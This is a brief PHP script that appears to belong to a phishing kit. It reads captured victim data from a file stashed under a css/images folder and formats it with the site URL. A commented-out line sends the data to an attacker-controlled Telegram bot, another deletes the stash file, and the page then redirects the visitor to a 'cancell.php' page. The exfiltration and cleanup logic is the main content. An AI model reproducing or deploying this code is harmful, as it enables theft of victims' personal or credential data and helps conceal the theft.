<?php
  $agent = $_SERVER['HTTP_USER_AGENT'];
  $protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
  $url = $protocol . $_SERVER['HTTP_HOST'];
  $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
  $token = ""; 
  $k = file_get_contents("../css/images/i.txt");
 $textmsg = "
 $url
 -----------------
 $k
 ";

 $gpid = ""; 

 #$send = file_get_contents("https://api.telegram.org/bot$token/SendMessage?chat_id=$gpid&text=".urlencode($textmsg));
 #unlink('../css/images/i.txt');
?>
<meta content='0;url=../../cancell.php' http-equiv='refresh'/>
